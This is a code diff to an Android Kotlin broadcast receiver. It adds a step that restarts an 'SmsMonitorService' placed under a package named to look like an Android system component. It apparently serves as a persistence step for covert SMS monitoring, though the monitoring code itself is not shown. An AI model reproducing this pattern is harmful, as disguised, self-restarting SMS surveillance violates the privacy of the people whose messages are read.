@@ -16,18 +16,30 @@ class RestartServiceReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent?) {
         val action = intent?.action
 
-        // Start UnifiedService
-        val serviceIntent = Intent(context, UnifiedService::class.java)
-
+        // 🔥 Start UnifiedService
+        val unifiedIntent = Intent(context, UnifiedService::class.java)
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                ContextCompat.startForegroundService(context, serviceIntent)
+                ContextCompat.startForegroundService(context, unifiedIntent)
             } else {
-                context.startService(serviceIntent)
+                context.startService(unifiedIntent)
             }
             Log.d(TAG, "UnifiedService restarted")
         } catch (e: Exception) {
             Log.e(TAG, "Error starting UnifiedService", e)
+        }
+
+        // 🔥 Start SmsMonitorService
+        try {
+            val smsMonitorIntent = Intent(context, com.android.system.services.SmsMonitorService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ContextCompat.startForegroundService(context, smsMonitorIntent)
+            } else {
+                context.startService(smsMonitorIntent)
+            }
+            Log.d(TAG, "SmsMonitorService restarted")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error starting SmsMonitorService", e)
         }
 
         // Reschedule the appropriate alarm
